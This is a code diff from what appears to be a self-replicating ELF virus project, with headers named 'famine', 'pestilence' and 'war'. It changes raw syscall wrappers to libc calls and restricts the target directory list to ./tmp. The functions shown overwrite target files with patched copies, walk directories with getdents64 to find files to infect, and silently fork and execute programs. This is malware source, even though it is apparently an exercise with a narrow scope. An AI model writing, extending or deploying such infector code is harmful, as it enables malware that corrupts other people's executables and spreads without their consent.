@@ -11,10 +11,10 @@
 #include "bss.h"
 #include "text.h"
 #include "pestilence.h"
-#include "syscall.h"
 #include "famine.h"
 #include "war.h"
 #include "daemon.h"
+#include "syscall.h"
 
 extern void end();
 void famine(void);
@@ -43,18 +43,18 @@ void	__attribute__((naked)) _start(void)
 
 static int	patch_new_file(t_data *data, const char *filename) {
 
-	_syscall(SYS_unlink, filename);
+	unlink(filename);
 
-	int fd = _syscall(SYS_open, filename, O_CREAT | O_WRONLY | O_TRUNC, data->elf.mode);
+	int fd = open(filename, O_CREAT | O_WRONLY | O_TRUNC, data->elf.mode);
 	if (fd == -1)
 		return 1;
 
-	if (_syscall(SYS_write, fd, data->file, data->size) == -1) {
-		_syscall(SYS_close, fd);
+	if (write(fd, data->file, data->size) == -1) {
+		close(fd);
 		return 1;
 	}
 
-	_syscall(SYS_close, fd);
+	close(fd);
 
 	return 0;
 }
@@ -201,35 +201,35 @@ static int	infect(const char *filename, const char *self_name)
 #ifdef ENABLE_EXEC
 static int execute_prog(const char *filename)
 {
-	pid_t pid = _syscall(SYS_fork);
+	pid_t pid = fork();
 	if (pid == 0) {
 
 		const char dev_null[] = "/dev/null";
-		int fd = _syscall(SYS_open, dev_null, O_RDONLY);
+		int fd = open(dev_null, O_RDONLY);
 		if (fd == -1)
 			return 1;
 
-		if (_syscall(SYS_dup2, fd, 0) < 0) {
-			_syscall(SYS_close, fd);
+		if (dup2(fd, 0) < 0) {
+			close(fd);
 			return 1;
 		}
-		if (_syscall(SYS_dup2, fd, 1) < 0) {
-			_syscall(SYS_close, fd);
+		if (dup2(fd, 1) < 0) {
+			close(fd);
 			return 1;
 		}
-		if (_syscall(SYS_dup2, fd, 2) < 0) {
-			_syscall(SYS_close, fd);
+		if (dup2(fd, 2) < 0) {
+			close(fd);
 			return 1;
 		}
 
-		_syscall(SYS_close, fd);
+		close(fd);
 
-		_syscall(SYS_execve, filename, 0, 0);
+		execve(filename, NULL, NULL);
 
-		_syscall(SYS_exit, 0);
+		exit(0);
 	} else if (pid > 0) {
 		int status;
-		_syscall(SYS_wait4, pid, &status, 0, 0);
+		wait4(pid, &status, 0, 0);
 		return (status == 0) ? 0 : 1;
 	} else {
 		return 1;
@@ -250,7 +250,7 @@ static void	make_path(char *path, const char *dir, const char *file)
 static void open_file(const char *file, const char *self_path, uint16_t *counter)
 {
 
-	int fd = _syscall(SYS_open, file, O_RDONLY);
+	int fd = open(file, O_RDONLY);
 	if (fd == -1)
 		return ;
 
@@ -260,7 +260,7 @@ static void open_file(const char *file, const char *self_path, uint16_t *counter
 
 	for(;;)
 	{
-		ret = _syscall(SYS_getdents64, fd, buf, PATH_MAX);
+		ret = getdents64(fd, buf, PATH_MAX);
 		if (ret <= 0)
 			break;
 		for (ssize_t i = 0; i < ret; i += dir->d_reclen)
@@ -294,7 +294,7 @@ static void open_file(const char *file, const char *self_path, uint16_t *counter
 		}
 	}
 
-	_syscall(SYS_close, fd);
+	close(fd);
 
 }
 
@@ -310,9 +310,7 @@ void	famine(void)
 	char host_name[PATH_MAX];
 
 	const char *paths[] = {
-		((char[]){"/tmp/test"}),
-		((char[]){"/tmp/test2"}),
-		((char[]){"./tmp"}),
+		(STR("./tmp")),
 		NULL
 	};
 
